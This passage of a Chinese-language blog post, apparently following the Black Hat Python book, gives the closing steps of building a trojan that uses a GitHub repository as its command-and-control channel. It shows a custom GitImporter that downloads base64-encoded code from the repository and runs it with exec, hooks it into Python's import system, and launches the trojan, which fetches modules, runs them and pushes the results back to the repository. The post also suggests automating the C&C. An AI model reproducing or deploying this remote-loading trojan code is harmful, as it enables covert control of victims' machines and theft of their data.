class=\"token punctuation\">(</span>new_library<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">return</span> self</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">load_module</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        spec <span class=\"token operator\">=</span> importlib<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>spec_from_loader<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> loader<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> origin<span class=\"token operator\">=</span>self<span class=\"token punctuation\">.</span>repo<span class=\"token punctuation\">.</span>git_url<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        new_module <span class=\"token operator\">=</span> importlib<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>module_from_spec<span class=\"token punctuation\">(</span>spec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">exec</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>current_module_code<span class=\"token punctuation\">,</span> new_module<span class=\"token punctuation\">.</span>__dict__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>modules<span class=\"token punctuation\">[</span>spec<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> new_module</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">return</span> new_module</pre></td></tr></table></figure><p>每当解释器尝试加载一个不存在的模块时，都会调用 GitImporter 类。<br />\n首先，解释器会调用  <code>find_module</code>  函数尝试找到这个模块，我们将这个调用交给远程加载器来处理。如果在仓库中找到这个文件，就将其中的代码以 base64 解码， 存储到我们的类里（GitHub 给我们的数据默认是 Base64 编码的）。<br />\n接着返回  <code>self</code>  ，告知解释器找到了这个模块，而且解释器可以调用  <code>self</code>  的  <code>load_module</code>  函数来实际加载模块。在这个函数里，我们调用 Python 原生的 importlib 库创建了一个空白的模块对象，并将我们从 GitHub 上拉取到的代码填进去。</p>\n</div></details>\n<h3 id=\"第六步\"><a class=\"anchor\" href=\"#第六步\">#</a> 第六步</h3>\n<details class=\"info\"><summary>执行代码</summary><div>\n<p>最后我们将新创建的模块插入 sys.modules 列表，这样未来的任何 import 语句都能直接找到它。</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\"># 将 GitImporter 添加到 sys.meta_path 列表中</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>meta_path<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>GitImporter<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\"># 创建木马对象</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    trojan <span class=\"token operator\">=</span> Trojan<span class=\"token punctuation\">(</span><span class=\"token string\">'abc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\"># 调用 run 函数</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    trojan<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>执行结果：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>可以看到它连接上了仓库，读取了配置文件，拉取了配置文件中设定的两个模块，并且运行了它们。</p>\n</div></details>\n<h2 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h2>\n<p>最后在木马文件夹中执行：  <code>git pull origin master</code>  把在仓库中  <code>data</code>  目录下的数据拉取回来。</p>\n<p><strong>在 Windows 上拉取会报一些莫名其妙的错误。</strong></p>\n<p>可以在 GitHub 上看到木马提交了两个模块的执行结果。</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>后面也可以对核心的 C&amp;C 机制进行若干改进。例如，自动化整个拉取数据、更新配置和发布木马的流程。</p>\n",
            "tags": [
                "BHP",
                "Python的import功能",
                "木马"
            ]
        }
    ]
}